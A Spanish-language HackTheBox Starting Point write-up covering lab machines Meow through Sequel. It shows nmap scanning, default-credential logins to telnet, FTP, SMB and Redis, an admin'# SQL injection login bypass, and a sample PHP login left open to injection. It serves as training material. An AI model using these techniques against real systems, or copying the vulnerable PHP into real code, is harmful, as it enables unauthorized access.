---
title: Starting Point - un HTB WriteUp
layout: page
permalink: /HTB_Starting_Point
---

<h2 id="whity">Starting Point - un HTB WriteUp</h2>

Todas las writeups del starting point como módulos introductorios a <a href="https://app.hackthebox.com/starting-point">HackTheBox</a>. Pasando por Tier1, Tier2, Tier3.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/ALL_startingPoint.png" alt="under" oncontextmenu="return false;">
</div>


<h2 id="whity">Índice</h2>

- [Meow](#meow)
- [Fawn](#fawn)
- [Dancing](#dancing)
- [Redeemer](#redeemer)
- [Appointment](#appointment)
- [Sequel](#sequel)
- [Crocodile](#crocodile)
- [Responder](#responder)
- [Three](#three)
- [Archetype](#archetype)
- [Oopsie](#oopsie)
- [Vaccine](#vaccine)
- [Unified](#unified)
<br>

<hr />
<h2 id="whity">Tier 1</h2>

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/tier1.png" alt="under" oncontextmenu="return false;">
</div>

<h2 id="meow"><h1 class="amarillo">Meow</h1></h2>

<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/meow.png" alt="under" oncontextmenu="return false;">
</div>

Antes de comenzar con Tier1 y la máquina <a><strong><em>Meow</em></strong></a> debemos configurar un par de cosas.
Estos son los 4 pasos a seguir para descargar la VPN especial de *HackTheBox*. Esencial para comenzar y desarrollar todas las máquinas de la plataforma.


<table border="1" style="width: 100%; text-align: center; border-collapse: collapse;">
  <thead>
    <tr>
      <th align="center">1</th>
      <th align="center">2</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><img src="/assets/images/HTB/StartingPoint/meow/vpn1.png" alt="VPN 1" oncontextmenu="return false;" style="width: 100%; height: auto;"></td>
      <td><img src="/assets/images/HTB/StartingPoint/meow/vpn2.png" alt="VPN 2" oncontextmenu="return false;" style="width: 100%; height: auto;"></td>
    </tr>
    <tr>
      <th align="center">3</th>
      <th align="center">4</th>
    </tr>
    <tr>
      <td><img src="/assets/images/HTB/StartingPoint/meow/vpn3.png" alt="VPN 3" oncontextmenu="return false;" style="width: 100%; height: auto;"></td>
      <td><img src="/assets/images/HTB/StartingPoint/meow/vpn4.png" alt="VPN 4" oncontextmenu="return false;" style="width: 100%; height: auto;"></td>
    </tr>
  </tbody>
</table>
<br>


Comenzamos agregando el target de la máquina en nuestra polybar con la utilidad elaborada por <a href="http://liandd.github.io/vpnScript.html">unkn0wn1122</a>:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/vpnscript.png" alt="under" oncontextmenu="return false;">
</div>

Una vez conectados a la VPN, procederemos a encender la máquina:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/spawn.png" alt="under" oncontextmenu="return false;">
</div>

Nos dara también la dirección IP de la máquina -> (10.129.85.116) y ya podremos comenzar:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/meow_ip.png" alt="under" oncontextmenu="return false;">
</div>

Ahora gracias a un script previamente definido en la .zshrc podemos también agregar a la polybar la dirección IP de la maáquina Meow.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/ips.png" alt="under" oncontextmenu="return false;">
</div>

Entonces tenemos 3 direcciones IP:

1. 10.129.85.116 de la máquina Meow
2. 10.10.16.84 de la VPN de HackTheBox -> Interfaz tun0
3. 192.168.0.11 nuestra propia dirección IP (Privada) -> Interfaz enp3s0
<br><br>

Como alternativa para saber donde encontrar estas direcciones podemos hacer uso del comando `ifconfig`:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/ifconfig.png" alt="under" oncontextmenu="return false;">
</div>
Ahora que ya hemos configurado nuestra máquina y hemos encendido Meow, podremos comenzar con la resolución de la misma.

<h2 class="amarillo">Enumeración</h2>

Creamos un directorio con el nombre de la máquina *Meow* y posterior creamos unos subdirectorios de trabajo 
```bash
mkdir {nmap,content,exploit}
```

Validamos tener nmap instalado con
```bash
nmap -v
```

Ahora vamos a lanzar un escaneo de reconocimiento llamado también fase de enumeración con nmap:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.85.116
```

<h3 class="verde">Explicación</h3>

- -p-: Escanea todo el rango de puertos (1-65535)
- --open: Muestra solo los puertos que están abiertos, ignorando cerrados y filtrados.
- -sS: Escaneo SYN (Sigiloso y rápido) no establece una conexión completa.
- --min-rate 5000: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- -vvv: Triple verbose o modo muy detallado, muestra información a tiempo real mientras se ejecuta el escaneo.
- -n: No resuelve nombres de dominio por tanto, no aplica resolución DNS.
- -Pn: No hace ping, asume que el host está activo aunque no responde ICMP.
<br><br>

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/nmap.png" alt="under" oncontextmenu="return false;">
</div>
Aunque, el escaneo está perfecto y nos da la información que estamos buscando sobre puertos abiertos, podemos hacer un retoque estético.
Para esto podemos exportar la captura nmap en un formato 'grep' para aplicar expresiones regulares y obtener lo más relevante en pantalla. Lo haremos agregando al final *-oG target*.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/nmap2.png" alt="under" oncontextmenu="return false;">
</div>
La diferencia es muy clara, tendremos centrada y detallada la información más relevante de la captura. Ahora haremos uso de la siguiente utilidad:
**extractPorts**
```bash
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        bat extractPorts.tmp
        rm extractPorts.tmp
}
```

Y como argumento le pasaremos la captura `target` de nmap:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>
Veremos como lo más importante es la dirección IP de la máquina Meow y su puerto abierto, en este caso 23.

Si queremos tener un poco más de información descriptiva sobre el servicio que se esta ejecutando en el puerto podemos ejecutar:
```bash
nmap -sCV -p23 10.129.85.116 -oN targeted
```

Estaremos escaneando la versión y servicio para el puerto 23 en la IP de la máquina Meow, y la estaremos exportando en formato 'nmap'/texto_plano en `targeted`.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/nmap3.png" alt="under" oncontextmenu="return false;">
</div>
 Y vemos que se está ejecutando un `telnet` y la máquina es Linux.

<h2 class="amarillo">Explotación</h2>

Telnet es un servicio orientado a conexiones remotas, y su mayor vulnerabilidad es establecer conexiones con credenciales por defecto.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/telnet.png" alt="under" oncontextmenu="return false;">
</div>
Una credencial muy utilizada es **root** y sin contraseña:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/telnet2.png" alt="under" oncontextmenu="return false;">
</div>
Ahora como nos hemos conectado a través de telnet con credenciales de `root` tenemos control total, solo queda buscar la flag para completar la máquina al 100%.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/meow/pwn.png" alt="under" oncontextmenu="return false;">
</div>

<hr />
<h2 id="fawn"><h2 class="amarillo">Fawn</h2></h2>
<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/fawn/fawn.png" alt="under" oncontextmenu="return false;">
</div>

Siempre es importante hacer uso de la utilidad `ifconfig` para saber nuestras direcciones IP (de la VPN, local, y de la máquina).

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/fawn/interfaces.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Enumeración</h2>

Entonces tenemos 3 direcciones IP:

1. 10.129.221.222 de la máquina Fawn
2. 10.10.16.84 de la VPN de HackTheBox -> Interfaz tun0
3. 192.168.0.11 nuestra propia dirección IP (Privada) -> Interfaz enp3s0
<br><br>

Una vez hecho esto, creamos nuestros directorios de trabajo `nmap, content, exploits` y entramos en nmap. Revisamos que la máquina este activa enviando 5 paquetes:

```bash
❯ ping -c 5 10.129.221.222 -R
PING 10.129.221.222 (10.129.221.222) 56(124) bytes of data.
64 bytes from 10.129.221.222: icmp_seq=1 ttl=63 time=102 ms
RR:     10.10.16.84  ---> Nuestra dirección IP de la VPN
        10.129.0.1   ---> Nodo intermediario
        10.129.221.222 -> Máquina Fawn
        10.129.221.222 -> Máquina Fawn
        10.10.16.1   ---> Nodo intermediario
        10.10.16.84  ---> Nuestra dirección IP de la VPN

64 bytes from 10.129.221.222: icmp_seq=2 ttl=63 time=99.0 ms    (same route)
64 bytes from 10.129.221.222: icmp_seq=3 ttl=63 time=100 ms     (same route)
64 bytes from 10.129.221.222: icmp_seq=4 ttl=63 time=97.0 ms    (same route)
64 bytes from 10.129.221.222: icmp_seq=5 ttl=63 time=97.3 ms    (same route)

--- 10.129.221.222 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4003ms
rtt min/avg/max/mdev = 97.040/99.087/102.049/1.851 ms
```

> Debido a los nodos intermediarios es que perdemos un paquete al revisar el TTL -> (Time to Live) donde 64 hace referencia a máquinas Linux y 128 a máquinas Windows. El nodo intermediario hace que baje en una unidad siempre por la VPN. Por tanto, ya sabemos a que nos estamos enfrentando.

Ahora vamos a lanzar un escaneo de reconocimiento llamado también fase de enumeración con nmap y directamente lo exportamos en archivo `grep`:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.221.222 -oG target
```

<h3 class="verde">Explicación</h3>

- -p-: Escanea todo el rango de puertos (1-65535)
- --open: Muestra solo los puertos que están abiertos, ignorando cerrados y filtrados.
- -sS: Escaneo SYN (Sigiloso y rápido) no establece una conexión completa.
- --min-rate 5000: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- -vvv: Triple verbose o modo muy detallado, muestra información a tiempo real mientras se ejecuta el escaneo.
- -n: No resuelve nombres de dominio por tanto, no aplica resolución DNS.
- -Pn: No hace ping, asume que el host está activo aunque no responde ICMP.
<br><br>

El escaneo es bastante rápido pero, para tener guardada la captura la exportamos en formato `grep` al archivo `target`. Así nos quedamos con lo más importante de la captura.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/fawn/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

Podemos ver que el puerto 21 está abierto y es FTP, especial atención a su posible versión ya que podría ser vulnerable. Para hacerlo podemos ejecutar:

```bash
nmap -sCV -p21 10.129.221.222 -oN targeted
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/fawn/nmap.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Explotación</h2>

Una vez exportada la captura vemos una información mucho más detallada, nos encontramos con **FTP vsftpd 3.0.3** y inmediatamente nmap nos reporta que el usuario `anonymous` puede iniciar sesión en FTP sin contraseña. Por tanto, FPT no está sanitizado. También vemos que nmap nos reporta un archivo con capacidades de lectura para dueño, grupo, y otros. Donde por 'otros' seriamos nosotros con el usuario anonymous, así que podremos leer ese archivo `flag.txt` si nos conectamos a FTP.

Probamos conexión por FPT a la 10.129.221.222
```bash
ftp 10.129.221.222
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/fawn/ftp.png" alt="under" oncontextmenu="return false;">
</div>

Nos pide credenciales y probamos con _"anonymous y sin contraseña"_. Con `ls` y `get` podremos acceder a la flag y tendremos completada la máquina.

<h2 class="amarillo">Scripting con Python3 y C++</h2>

**C++**
```c++
#include <curl/curl.h>
#include <fstream>
#include <iostream>

size_t write_callback(void *ptr, size_t size, size_t nmemb, void *stream) {
  std::ofstream *file = static_cast<std::ofstream *>(stream);
  file->write(static_cast<char *>(ptr), size * nmemb);
  return size * nmemb;
}

int main() {
  CURL *curl;
  CURLcode res;

  std::string ftp_url = "ftp://10.129.221.222/flag.txt";
  std::string usuario = "anonymous:";
  std::ofstream archivo_local("script_cpp.txt", std::ios::binary);

  if (!archivo_local) {
    std::cerr << "[!] Error al abrir el archivo local para escribir.\n";
    return 1;
  }

  curl_global_init(CURL_GLOBAL_DEFAULT);
  curl = curl_easy_init();

  if (curl) {
    curl_easy_setopt(curl, CURLOPT_URL, ftp_url.c_str());
    curl_easy_setopt(curl, CURLOPT_USERPWD, usuario.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &archivo_local);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
      std::cerr << "[!] Error: " << curl_easy_strerror(res) << std::endl;
    }

    curl_easy_cleanup(curl);
  }

  curl_global_cleanup();
  archivo_local.close();

  return 0;
}
```

**Python3**
```python
#!/usr/bin/env python3
from ftplib import FTP
import sys
import signal
from termcolor import colored

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Ctrl + C

def main():
    FTP_HOST = "10.129.221.222"
    FTP_USER = "anonymous"
    FTP_PASS = ""
    file = "flag.txt"
    file_script = "script_py.txt"
    try:
        ftp = FTP(FTP_HOST)
        ftp.login(FTP_USER, FTP_PASS)
        with open(file_script, "wb") as f:
            ftp.retrbinary(f"RETR {file}", f.write)
        print(colored(f"\n[+] Archivo remoto {file} descargado como {file_script}", 'green'))
        ftp.quit()
    except Exception as e:
        print(colored(f"\n[!] {e}",'red'))

if __name__ == "__main__":
    main()
```
<hr />
<h2 id="dancing"><h2 class="amarillo">Dancing</h2></h2>
<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/dancing/dancing.png" alt="under" oncontextmenu="return false;">
</div>

Ya sabes como empezar, primero encendiendo la máquina, ubicando nuestras respectivas direcciones IP, creando un directorio con el nombre de la máquina **Dancing** y podremos comenzar.

<h2 class="amarillo">Enumeración</h2>

Una vez hecho esto, creamos nuestros directorios de trabajo `nmap, content, exploits` y entramos en nmap. Revisamos que la máquina este activa enviando 5 paquetes:

```bash
❯ ping -c 5 10.129.174.184
PING 10.129.174.184 (10.129.174.184) 56(124) bytes of data.
64 bytes from 10.129.174.184: icmp_seq=1 ttl=127 time=102 ms
64 bytes from 10.129.221.222: icmp_seq=2 ttl=127 time=99.0 ms    (same route)
64 bytes from 10.129.221.222: icmp_seq=3 ttl=127 time=100 ms     (same route)
64 bytes from 10.129.221.222: icmp_seq=4 ttl=127 time=97.0 ms    (same route)
64 bytes from 10.129.221.222: icmp_seq=5 ttl=127 time=97.3 ms    (same route)

--- 10.129.221.222 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4003ms
rtt min/avg/max/mdev = 97.040/99.087/102.049/1.851 ms
```

Una vez encendida la máquina vamos a comenzar a realizar una fase de reconocimiento o enumeración usando la herramienta nmap y directamente lo exportamos en archivo `grep`:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.174.184 -oG target
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/dancing/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Podemos ver que hay una gran cantidad de puertos abiertos. Por tanto, podemos hacer uso de la herramienta `extractPorts` y le pasamos como argumento la captura `target`:

**extractPorts**
```bash
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        bat extractPorts.tmp
        rm extractPorts.tmp
}
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/dancing/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>

Ahora vemos lo más importante como la dirección IP y los puertos abiertos `135, 139, 445, 5985, 47001, 49664, 49665, 49666, 49667, 49668, 49669`.
Vamos a prestar especial atención a estos puertos, ya que pueden tener versiones o servicios expuestos vulnerables. Para ello ejecutamos:

```bash
nmap -sCV -p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.129.174.184 -oN targeted
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/dancing/nmap2.png" alt="under" oncontextmenu="return false;">
</div>


Tratando de enumerar un poco con la herramienta `whatweb` para conocer el servicio web que estamos viendo por el puerto **5985** nos encontramos un servicio HTTPserver pero, poco mas.

```bash
❯ whatweb 10.129.203.2:5985
http://10.129.203.2:5985 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-HTTPAPI/2.0], IP[10.129.203.2], Microsoft-HTTPAPI[2.0], Title[Not Found]
```

<h2 class="amarillo">Explotación</h2>

Especial atención a el puerto `445` ya que ese puerto en especial pertenece al servicio `Server Message Block`. SMB se usa para el acceso a redes MS por TCP/IP. Podemos hacer uso de la herramienta `smbclient` que nos permite listar directorios compartidos a nivel de red.

> **smbclient** es una herramienta que permite acceder a los recursos compartidos de un servidor SMB, de forma similar a un cliente FTP de línea de comandos.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/dancing/smbclient.png" alt="under" oncontextmenu="return false;">
</div>

Y podemos ver los siguientes directorios compartidos a nivel de red:

- ADMIN$
- C$
- IPC$
- WorkShares
<br><br>

Para probar acceder a cada uno de estos recursos es a través del comando smbclient hasta que alguno nos responde estableciendo una conexión.

```bash
smbclient \\\\10.129.174.184\\ADMIN
smbclient \\\\10.129.174.184\\C
smbclient \\\\10.129.174.184\\IPC
smbclient \\\\10.129.174.184\\WorkShares
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/dancing/smbclient2.png" alt="under" oncontextmenu="return false;">
</div>

Y obtenemos acceso con 'WorkShares', y podemos hacer uso de algunos comandos familiares como `ls, dir, cd, get`.

Y encontramos un directorio 'James.P' donde encontramos la `flag` y hemos completado la máquina.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/dancing/flag.png" alt="under" oncontextmenu="return false;">
</div>

<hr />
<h2 id="redeemer"><h2 class="amarillo">Redeemer</h2></h2>
<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/redeemer/redeemer.webp" alt="under" oncontextmenu="return false;">
</div>

Estamos frente a la ultima máquina del Starting Point del Tier1. Así como hemos hecho con las anteriores máquinas es importante ir aplicando la metodología. (Encender la máquina, verificar nuestras direcciones IP, crear el directorio con el nombre de la máquina, y los subdirectorios de trabajo, ya conocer la utilidad `ifconfig` y organizar todo antes de la fase de enumeración). 
<h2 class="amarillo">Enumeración</h2>

Comenzamos haciendo un ping para saber sí la máquina está activa:

```bash
❯ ping -c 5 10.129.191.232 -R
PING 10.129.191.232 (10.129.191.232) 56(124) bytes of data.
64 bytes from 10.129.191.232: icmp_seq=1 ttl=63 time=113 ms
RR:     10.10.16.84
        10.129.0.1
        10.129.191.232
        10.129.191.232
        10.10.16.1
        10.10.16.84
64 bytes from 10.129.191.232: icmp_seq=2 ttl=63 time=110 ms     (same route)
64 bytes from 10.129.191.232: icmp_seq=3 ttl=63 time=116 ms     (same route)
64 bytes from 10.129.191.232: icmp_seq=4 ttl=63 time=110 ms     (same route)
64 bytes from 10.129.191.232: icmp_seq=5 ttl=63 time=111 ms     (same route)
--- 10.129.191.232 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4004ms
rtt min/avg/max/mdev = 110.122/112.022/115.733/2.038 ms
```

Vamos a realizar un escaneo de puertos sigiloso y rápido utilizando la herramienta nmap:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.191.232 -oG target
```

Y el escaneo nos arroja un único puerto abierto:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/redeemer/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Al ser un único puerto, aun necesitamos un poco mas de información respecto a ese puerto, para ello haremos uso de nmap con una serie de scripts básicos de reconocimiento:

```bash
nmap -sCV -p6379 10.129.191.232 -oN targeted
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/redeemer/nmap2.png" alt="under" oncontextmenu="return false;">
</div>
<h2 class="amarillo">Explotación</h2>

Podemos ver que el puerto 6379  pertenece a un servicio **REDIS** con una versión `5.0.7`. A pesar de buscar en la web sobre está versión y encontrar algunas CVE, ninguna tiene relación a la explotación.

> **REDIS** es una base de datos de Key y Value. Usa pares de datos para guardar la información lo que las hace muy eficientes y similares a los diccionarios. En lugar de crear tablas y relaciones hace pares de datos.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/redeemer/redis.png" alt="under" oncontextmenu="return false;">
</div>

**Redis desde su web oficial**
```python
import redis

r = redis.Redis(host="localhost", port=6379, db=0, decode_responses=True)

res = r.set("bike:1", "Process 134")
print(res)
# >>> True

res = r.get("bike:1")
print(res)
# >>> "Process 134"
```

Dentro de los comandos que podemos usar tenemos algunos sencillos como `info, get, select`.

Podemos instalar _REDIS_ ejecutando `sudo pacman -S redis` y nos crea dos binarios.

- redis-cli
- redis-server
<br><br>
Podemos hacer uso de `redis-cli -h` para tener un poco más de información de las flags para usar la herramienta y nos conectamos usando:
<br><br>
```bash
redis-cli -h 10.129.191.232 -p 6379
```

Y al conectarnos hacemos el comando `info` para ver un poco más de información, y vemos que hay una 'Base de Datos' llamada **db0**. Y tiene 4 claves de pares y valores.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/redeemer/redis3.png" alt="under" oncontextmenu="return false;">
</div>

Podemos usar `select 0` para seleccionar esa base de datos **db0**, y para ver las llaves podemos usars `keys *`. Y con `get` nos traemos la llave **flag**.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/redeemer/redis4.png" alt="under" oncontextmenu="return false;">
</div>

Y así hemos <a><strong><em>pw3nd</em></strong></a> la máquina y completado el Tier1 del Starting Point.
<hr />
<h2 id="whity">Tier 2</h2>

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/tier2.png" alt="under" oncontextmenu="return false;">
</div>

<h2 id="appointment"><h1 class="amarillo">Appointment</h1></h2>

<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/appointment/appointment.png" alt="under" oncontextmenu="return false;">
</div>

Vamos a encender la máquina, y nos da la dirección IP 10.129.84.205 y lanzamos un ping para saber a que nos estamos enfrentando si a una máquina Linux o Windows.

```bash
❯ ping -c 5 10.129.84.205
PING 10.129.84.205 (10.129.84.205) 56(84) bytes of data.
64 bytes from 10.129.84.205: icmp_seq=1 ttl=63 time=97.4 ms
64 bytes from 10.129.84.205: icmp_seq=2 ttl=63 time=98.0 ms
64 bytes from 10.129.84.205: icmp_seq=3 ttl=63 time=98.6 ms
64 bytes from 10.129.84.205: icmp_seq=4 ttl=63 time=100 ms
64 bytes from 10.129.84.205: icmp_seq=5 ttl=63 time=109 ms
--- 10.129.84.205 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4004ms
rtt min/avg/max/mdev = 97.444/100.782/109.425/4.438 ms
```

Vemos un TTL de 63. Por tanto, máquina Linux.
<h2 class="amarillo">Enumeración</h2>

Para hacer un escaneo rápido y sigiloso usamos nmap:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.84.205 -oG allPorts
```

Abrimos la captura de nmap de todos los puertos abiertos y vemos únicamente el puerto `80`.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/appointment/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Para no tener tanto ruido de la captura, con la herramienta **extractPorts** se nos parsea la información más relevante por consola:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/appointment/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>

Lanzamos una serie de scripts básicos de reconocimiento para identificar la versión y servicio de ese puerto 80 de la siguiente manera con nmap:

```bash
nmap -sCV -p80 10.129.84.205 -oN targeted
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/appointment/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

La captura revela un servicio HTTP Apache y Login pero, poco más. Haciendo uso de la herramienta `whatweb` podemos tratar de enumerar un poco sobre el servicio HTTP y efectivamente vemos un Login.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/appointment/whatweb.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Explotación</h2>

Con ayuda de nmap podemos lanzar un script programado en Lua, para identificar rutas comunes almacenadas en un diccionario de 1060-1080 entradas posibles para enumerar posibles rutas:

```bash
nmap --script http-enum 10.129.84.205 -oN webScan
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/appointment/webScan.png" alt="under" oncontextmenu="return false;">
</div>

A pesar de encontrar estos directorios, no son útiles y no vemos nada más allá de lo habitual, así que ingresamos a la web:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/appointment/login.png" alt="under" oncontextmenu="return false;">
</div>

Efectivamente estamos viendo que se emplea un Login, probamos con credenciales por defecto 'admin:admin. admin:password. root:root' pero no logramos nada. Otra forma alternativa si no es por credenciales por defecto es que puede estar aplicando una Base de Datos MySQL y debamos hacer una SQL Injection.

----
<h3 class="verde">¿Qué es una SQL Injection?</h3>

La inyección de SQL es un tipo de ciberataque encubierto en el cual un hacker inserta código propio en un sitio web con el fin de quebrantar las medidas de seguridad y acceder a datos protegidos. Una vez dentro, puede controlar la base de datos del sitio web y secuestrar la información de los usuarios.

> **SQL** : Viene de Structured Query Language.

Estas vulnerabilidades están relacionados con **AO3:201-Injection**.

Para la SQL Injection la idea es explotar los statements de la base de datos ya que estos almacenan datos de entrada de usuario.

---

Suponiendo que la página renderiza el Login con código .PHP aquí hay un ejemplo de código vulnerable a SQL Injection:

```php
<?php
mysql_connect("localhost", "db_username", "db_password"); # Connection to the SQL Database.
mysql_select_db("users"); # Database table where user information is stored.
$username=$_POST['username']; # User-specified username.
$password=$_POST['password']; #User-specified password.

# Query for user/pass retrieval from the DB.
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";

# Performs query stored in $sql and stores it in $result.
$result=mysql_query($sql);

# Sets the $count variable to the number of rows stored in $result.
$count=mysql_num_rows($result);

# Checks if there's at least 1 result, and if yes:
if ($count==1){
	$_SESSION['username'] = $username; # Creates a session with the specified $username.
	$_SESSION['password'] = $password; # Creates a session with the specified $password.
	header("location:home.php"); # Redirect to homepage.
}
else { 
	# If there's no singular result of a user/pass combination:
	header("location:login.php");
	
	# No redirection, as the login failed in the case the $count variable is not equal to 1,
	HTTP Response code 200 OK.
}
?>
```

> Para comentar código en .PHP se usa '#'. Así que probamos con 

- admin'#
- pruebapassword123

Y obtenemos la flag.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/appointment/flagd.png" alt="under" oncontextmenu="return false;">
</div>

<hr />
<h2 id="sequel"><h1 class="amarillo">Sequel</h1></h2>

<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/sequel/sequel.png" alt="under" oncontextmenu="return false;">
</div>
Encendemos la máquina y nos da la dirección IP 10.129.133.7, enviamos un ping para saber si es Linux o Windows.

```bash
❯ ping -c 5 10.129.133.7
PING 10.129.133.7 (10.129.133.7) 56(84) bytes of data.
64 bytes from 10.129.133.7: icmp_seq=1 ttl=63 time=106 ms
64 bytes from 10.129.133.7: icmp_seq=2 ttl=63 time=98.7 ms
64 bytes from 10.129.133.7: icmp_seq=3 ttl=63 time=97.6 ms
64 bytes from 10.129.133.7: icmp_seq=4 ttl=63 time=98.0 ms
64 bytes from 10.129.133.7: icmp_seq=5 ttl=63 time=97.4 ms
--- 10.129.133.7 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4004ms
rtt min/avg/max/mdev = 97.428/99.446/105.501/3.059 ms
```

Vemos un TTL 63 así que estamos frente a una máquina Linux.
<h2 class="amarillo">Enumeración</h2>

Para la fase de enumeración vamos a lanzar un escaneo rápido y sigiloso con nmap:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.133.7 -oG allPorts
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/sequel/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Vemos como puerto abierto `3306` un MySQL, y limpiando un poco el ruido de la captura parsearemos la información de la captura con **extractPorts**:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/sequel/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>

Vamos a realizar un escaneo con una serie de scripts básicos de reconocimiento para identificar la versión y servicio del puerto MySQL.

```bash
nmap -sCV -p3306 10.129.133.7 -oG targeted
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/sequel/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Explotación</h2>

Para poder explotar este puerto podemos probar a loguearnos con credenciales por defecto al servicio MySQL usando mariadb.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/sequel/maria.png" alt="under" oncontextmenu="return false;">
</div>

Para solucionar este error de SSL ya que es una version algo desactualizada de SQL agregamos la flag '--ssl=OFF'. Y para las credenciales usamos la flag '-u root'.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/sequel/maria2.png" alt="under" oncontextmenu="return false;">
</div>

